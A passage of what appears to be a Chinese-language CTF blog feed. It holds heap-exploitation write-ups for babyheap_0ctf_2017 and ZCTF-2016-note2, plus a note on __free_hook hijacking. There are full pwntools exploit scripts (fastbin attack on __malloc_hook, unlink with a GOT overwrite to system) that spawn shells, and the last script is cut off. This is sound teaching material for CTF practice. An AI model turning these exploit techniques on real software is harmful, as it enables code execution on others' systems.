class="number">1</span>]</span><br></pre></td></tr></table></figure></li><li><p>这时就可以用 fastbin attack, 往 fastbin 链表中填入 __malloc_hook 的地址, 再 malloc 出来修改为 one_gadget 的地址从而 getshell, 但需要注意的是, 要绕过 malloc 的安全防护机制 (size 位的校验), 这里只需要稍微偏移一下即可</p><p>  其中 0x7ffff7dd4b10 是上面计算出来的 __malloc_hook 的地址</p>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x7ffff7dd4b10 - 0x23</span><br><span class="line">0x7ffff7dd4aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd3260000000      0x000000000000007f</span><br><span class="line">0x7ffff7dd4afd: 0xfff7ab2b00000000      0xfff7ab2aa000007f</span><br><span class="line">0x7ffff7dd4b0d &lt;__realloc_hook+5&gt;:      0x000000000000007f      0x0000000000000000</span><br><span class="line">0x7ffff7dd4b1d: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakefd = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(fakefd)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">1</span>, <span class="number">0x28</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(fakefd))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">4</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyheap_0ctf_2017&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sda = p.sendafter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Command: &quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Command: &quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sda(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Command: &quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Command: &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x3f3d6</span>, <span class="number">0x3f42a</span>, <span class="number">0xd5bf7</span>]</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># 0</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># 2</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x0</span>) * <span class="number">3</span> + p64(<span class="number">0x41</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x71</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x30</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">1</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;\x91&quot;</span> + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;leak_addr: %s&quot;</span> % <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">libc.address = leak_addr - <span class="number">0x39bb78</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc address: %s&quot;</span> % <span class="built_in">hex</span>(libc.address))</span><br><span class="line">log.success(<span class="string">&quot;malloc address: %s&quot;</span> % <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *(0x555555554000 + 0x000000000001147)&quot;)</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc.address  + one[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">fakefd = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(fakefd)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">1</span>, <span class="number">0x28</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(fakefd))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">4</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>__free_hook 劫持原理</title>
      <link href="/note-pwn-free-hook/"/>
      <url>/note-pwn-free-hook/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文学习自Ex师傅的<a href="http://blog.eonew.cn/archives/521">__free_hook 劫持原理</a>, 根据学习情况略有补充和修改</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>先从一个简单的例子来讲, 下面代码直接队全局变量<code>__free_hook</code>进行修改</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">void</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="keyword">void</span> *__ptr,<span class="keyword">const</span> <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *str = <span class="built_in">malloc</span>(<span class="number">160</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(str,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;__free_hook: %p\n&quot;</span>,__free_hook);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 劫持__free_hook</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot; __free_hook abduction&quot;</span>);</span><br><span class="line">        __free_hook = (<span class="keyword">void</span>*)system;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">free</span>(str);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;__free_hook: %p\n&quot;</span>,__free_hook);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  work gcc __free_hook.c -o __free_hook</span><br><span class="line">➜  work ./__free_hook</span><br><span class="line">__free_hook: (nil)</span><br><span class="line"> __free_hook abduction</span><br><span class="line">$ <span class="built_in">echo</span> hello world</span><br><span class="line">hello world</span><br><span class="line">$</span><br><span class="line">__free_hook: 0x7f545a07f4e0</span><br></pre></td></tr></table></figure><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><ul><li>源码来自 <a href="http://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz">glibc 2.23</a>, 后面是行号</li></ul><p>glibc-2.23/malloc/malloc.c: 1851</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">weak_variable</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="keyword">void</span> *__ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="keyword">const</span> <span class="keyword">void</span> *)</span> </span>= <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>这里定义为的<code>__free_hook</code>定义为全局变量，所以可以直接被修改。再来看看<code>__free_hook</code>的引用:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码是<code>free()</code>函数的一部分，可以看出程序先把全局变量<code>__free_hook</code>赋给了局部变量<code>hook</code>，然后对<code>hook</code>是否为<code>NULL</code>进行判断，如果不为空，则执行<code>hook</code>，第一个参数就是<code>chunk</code>的内容部分。</p><p>一般情况下<code>__free_hook</code>是为<code>NULL</code>, 因此上述代码是不会执行的, 但是如果恶意修改<code>__free_hook</code>, 就会造成<code>__free_hook</code>劫持, 如例子所示</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.eonew.cn/archives/521">__free_hook 劫持原理</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZCTF-2016-note2</title>
      <link href="/wp-item-ZCTF-2016-note2/"/>
      <url>/wp-item-ZCTF-2016-note2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ZCTF-2016-note2"><a href="#ZCTF-2016-note2" class="headerlink" title="ZCTF-2016-note2"></a>ZCTF-2016-note2</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2">题目地址</a></p><ul><li>libc version: 2.23</li><li><code>checksec note2</code>:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ZCTF-2016-note2 checksec note2</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/Users/Lantern/Desktop/note/pwn_note/items/ZCTF-2016-note2/note2&#x27;</span></span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></li></ul><p>没有开 PIE, 因此段地址固定</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序有以下功能:</p><ul><li>New: 新建 note, size 最大为 0x80, note 最多能有4个</li><li>Show: 展示 note 内容</li><li>Edit: 编辑 note 内容, 可以覆盖已有 note, 也可以在已有 note 后面续写</li><li>Delte: 释放 note</li></ul><p>而漏洞点如下</p><ol><li><p>在 read_str 函数中读取的循环变量 i 是无符号变量, 那么当我们输入 size 为 0 时, glibc 根据其规定, 会分配 0x20 个字节, 但是程序读取的内容却并不受到限制, 故而会产生堆溢出。</p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">read_str</span><span class="params">(<span class="keyword">char</span> *s, __int64 len, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> end_chr; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  end_chr = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; len - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == end_chr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    s[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  s[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>每次 edit 时, 都会申请 0xa0 大小的内存, 但是在 free 之后并没有把指针设置为 NULL, 存在 UAF 漏洞</p></li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>创建三个 chunk, 第二个 chunk 的大小设置为 0, 这样该 chunk 释放后就被归为 fast bin, 当我们再次申请 0 大小的 chunk 时, 该 chunk 就会被分配出去, 因为该 chunk 位于两个 chunk 之间, 此时就可以利用第一个漏洞, 对第三个 chunk 进行溢出, 修改其 chunk 头, 进行 free(chunk3) , 触发 unlink。</p><p> 创建三个chunk, chunk1 伪造 free_chunk 为 unlink 做准备</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + p64(<span class="number">0x61</span>) + p64(ptr - <span class="number">0x18</span>)  + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_note(<span class="number">0x80</span>, payload) <span class="comment"># 0</span></span><br><span class="line">new_note(<span class="number">0</span>,   <span class="string">&#x27;b&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">new_note(<span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><p> 此时堆结构:</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE &lt;== chunk1</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE &lt;== chunk2</span><br><span class="line">Addr: 0x603090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE &lt;== chunk3</span><br><span class="line">Addr: 0x6030b0</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603140</span><br><span class="line">Size: 0x20ec1</span><br></pre></td></tr></table></figure><p> 此时释放 chunk2</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete_note(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> 回收至 fastbin 中</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603090 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p> 重新分配一个 size 为 0 的 chunk, 此时就会把 chunk2 分配回来, 这样就可以利用第一个漏洞覆盖 chunk3 的 size 域</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;b&quot;</span> * <span class="number">16</span> + p64(<span class="number">0x80</span> + <span class="number">0x20</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">new_note(<span class="number">0</span>, payload)</span><br></pre></td></tr></table></figure><p> 此时 chunk3 内容如下, 可以看到 prev_inused 位被置0, pre_size 位被置 0xa0, 即 chunk1_size + chunk2_size</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo 0x6030b0</span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : False -&gt; p-&gt;size(0x60) != next-&gt;prevsize(0xa0)</span><br><span class="line">prev_size : 0xa0</span><br><span class="line">size : 0x90</span><br><span class="line">prev_inused : 0</span><br><span class="line">is_mmap : 0</span><br><span class="line">non_mainarea : 0</span><br></pre></td></tr></table></figure><p> 此时 free chunk3 (<code>delete_note(2)</code>) 即触发 unlink</p></li><li><p>利用 unlink, 通过程序的 show note 功能获取 atoi 的地址, 进而算出 system 的地址, 然后修改 atoi@got 指针中的地址为 system 的地址, 获得 shell。</p></li></ol><p>  unlink 以后, 此时 note_list[0] (0x602120) 存放的是 0x602108</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x602120</span><br><span class="line">0x602120:       0x0000000000602108  </span><br></pre></td></tr></table></figure><p>  此时修改 chunk1 即是 修改 note_list</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit_note(<span class="number">0</span>, <span class="number">1</span> , payload)</span><br></pre></td></tr></table></figure><p>  此时 node_list</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x602120</span><br><span class="line">0x602120:       0x0000000000602088</span><br><span class="line">pwndbg&gt; x/gx 0x0000000000602088</span><br><span class="line">0x602088 &lt;atoi@got.plt&gt;:        0x00007ffff7a61080  </span><br></pre></td></tr></table></figure><p>  这样<code>show(0)</code>展示的就是 atoi 的地址了, 就可以依此计算 system 的地址</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">show_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Content is &quot;</span>)</span><br><span class="line">atoi_address = u64(ru(<span class="string">&quot;\n&quot;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc.address = atoi_address - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_address = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><p>  此时修改 edit chunk1 就是修改 atoi 的地址, 我们通过修改 atoi 为 systen 从而当我们传入 <code>/bin/sh</code> 就可以 getshell</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(system_address)</span><br><span class="line">edit_note(<span class="number">0</span>, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;option---&gt;&gt;&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&quot;./note2&quot;</span>], env=&#123;<span class="string">&quot;LOAD_PRELOAD&quot;</span>: <span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sd = p.send</span><br><span class="line">sda = p.sendafter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">break_point</span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b &quot;</span> + break_point)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_note</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;option---&gt;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input the length of the note content:(less than 128)&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Input the note content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;option---&gt;&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input the id of the note:&quot;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_note</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;option---&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input the id of the note:&quot;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span>(<span class="params"><span class="built_in">id</span>, option, content</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;option---&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input the id of the note:&quot;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    sla(<span class="string">&quot;[1.overwrite/2.append]&quot;</span>, <span class="built_in">str</span>(option))</span><br><span class="line">    sla(<span class="string">&quot;TheNewContents:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Input your name:&quot;</span>, <span class="string">&quot;Lantern&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Input your address:&quot;</span>, <span class="string">&quot;Lantern&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(&quot;*0x000000000400B0F&quot;)</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + p64(<span class="number">0x61</span>) + p64(ptr - <span class="number">0x18</span>)  + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_note(<span class="number">0x80</span>, payload) <span class="comment"># 0</span></span><br><span class="line">new_note(<span class="number">0</span>,   <span class="string">&#x27;b&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">new_note(<span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;b&quot;</span> * <span class="number">16</span> + p64(<span class="number">0x80</span> + <span class="number">0x20</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">new_note(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit_note(<span class="number">0</span>, <span class="number">1</span> , payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Content is &quot;</span>)</span><br><span class="line">atoi_address = u64(ru(<span class="string">&quot;\n&quot;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;atoi_address: &quot;</span> + <span class="built_in">hex</span>(atoi_address))</span><br><span class="line"></span><br><span class="line">libc.address = atoi_address - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_address = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;system_address: &quot;</span> + <span class="built_in">hex</span>(system_address))</span><br><span class="line">log.success(<span class="string">&quot;libc.address: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = p64(system_address)</span><br><span class="line">edit_note(<span class="number">0</span>, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;option---&gt;&gt;&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span 